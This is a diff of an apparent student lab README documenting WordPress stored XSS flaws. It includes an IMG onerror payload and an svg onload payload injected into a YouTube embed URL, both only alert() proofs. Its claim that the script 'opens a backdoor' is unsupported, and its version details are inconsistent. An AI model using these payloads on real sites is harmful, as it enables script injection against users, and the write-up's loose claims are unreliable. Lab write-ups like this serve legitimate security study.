@@ -18,14 +18,14 @@ Time spent: **X** hours spent in total
 		<p class="p1"><span class="s1">&lt;IMG SRC=&#8221;#&#8221; ONERROR=&#8221;</span><span class="s2">alert(&#8216;XSS&#8217;)</span><span class="s1">&#8220;/&gt;</span></p>.....
 			</div><!-- .entry-content -->
     - [Link 1](https://github.com/WordPress/WordPress/commit/c9e60dab176635d4bfaaf431c0ea891e4726d6e0)
-1. (Required) Vulnerability Name or ID
-  - [ ] Summary: 
-    - Vulnerability types:
-    - Tested in version:
-    - Fixed in version: 
-  - [ ] GIF Walkthrough: 
-  - [ ] Steps to recreate: 
-  - [ ] Affected source code:
+1. (Required) Vulnerability Name or ID: WordPress  4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
+  - [ ] Summary: Script opens backdoor that gives attacker access to the site. 
+    - Vulnerability types: XSS
+    - Tested in version: WP 4.2
+    - Fixed in version: WP 4.2.13
+  - [ ] GIF Walkthrough: <a href="https://imgur.com/88S3nye"><img src="https://i.imgur.com/88S3nye.gif" title="source: imgur.com" /></a>
+  - [ ] Steps to recreate: Find youtube video link to embed. Use the following code on the end x3csvg onload=alert(1)x3e’ Open backdoor to site.
+  - [ ] Affected source code:<iframe width="560" height="315" src="’https://www.youtube.com/embed/fWeR6UhHRAM\x3csvg onload=alert(1)x3e’" frameborder="0" allowfullscreen></iframe>
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 1. (Required) Vulnerability Name or ID
   - [ ] Summary: 
